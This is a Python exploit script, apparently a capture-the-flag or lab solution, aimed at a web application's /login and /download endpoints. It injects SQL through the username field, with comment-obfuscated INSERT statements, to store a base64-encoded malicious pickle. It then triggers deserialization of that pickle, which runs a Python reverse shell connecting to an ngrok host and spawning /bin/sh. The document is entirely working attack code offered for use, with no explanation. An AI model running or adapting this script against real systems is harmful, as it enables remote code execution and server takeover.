#!/usr/bin/env python3
import pickle
import base64
import os
import requests
import sys
import uuid

class RCE:
    def __reduce__(self):
        cmd = ("""export RHOST="6.tcp.ngrok.io";export RPORT=11435;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'""")
        return os.system, (cmd,)

if len(sys.argv) != 2:
    print(f'Usage: {sys.argv[0]} <url>')
    sys.exit(1)

url = sys.argv[1]

pickled = pickle.dumps(RCE())
payload = base64.b64encode(pickled).decode()

session = str(uuid.uuid4())
insert = f"\\;INSERT/**/INTO/**/activesessions/**/(sessionid)/**/values(\\{session}\\);INSERT/**/OR/**/IGNORE/**/INTO/**/files/**/VALUES(\\{session}\\,\\{payload}\\,NULL)/*"

print(f'[*] Sending payload')
requests.post(url + '/login', data={'username': insert, 'password': 'test'})
print(f'[+] Session and file created: {session}')

print(f'[*] Executing pickle payload')
r = requests.get(url + f'/download/{session}/{session}')

print(r.text)